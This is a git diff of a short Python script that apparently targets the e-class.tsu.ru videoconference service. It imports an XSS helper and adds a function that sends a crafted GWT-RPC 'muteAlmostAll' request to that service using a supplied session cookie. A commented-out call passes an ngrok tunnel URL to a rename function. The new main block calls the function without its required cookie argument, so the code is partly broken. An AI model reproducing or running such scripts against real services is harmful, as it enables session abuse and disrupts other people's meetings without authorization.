@@ -1,5 +1,5 @@
 import requests
-from config import get_xss, TARGET_URL, get_base_headers
+from config import get_xss, TARGET_URL, get_headers,get_base_headers
 from helper import load_json_postData
 
 
@@ -22,10 +22,22 @@ def message():
         headers=headers,
     )
     print(urls.content)
+    
+def message_test_message(cookie):
+    headers = get_headers(cookie)
+    postData = "7|0|4|https://e-class.tsu.ru/videoconference/|396AA239B4CD4368870E53E2588A2DA5|com.mind.videoconference.rpc.api.MediaControllerService|muteAlmostAll|1|2|3|4|0|"
+    urls = requests.post(
+        url="https://e-class.tsu.ru/videoconference/service/media",
+        data=postData,
+        headers=headers,
+    )
+    print(urls.content)
+    return urls.content
 
 
 if __name__ == "__main__":
-    rename(
-        "https://d8c6-2001-47c8-4b3f-2b00-7c0e-5a0b-9a7a.ngrok-free.app"
-    )
-    message()
+    # rename(
+    #     "https://d8c6-2001-47c8-4b3f-2b00-7c0e-5a0b-9a7a.ngrok-free.app"
+    # )
+    message_test_message()
+    
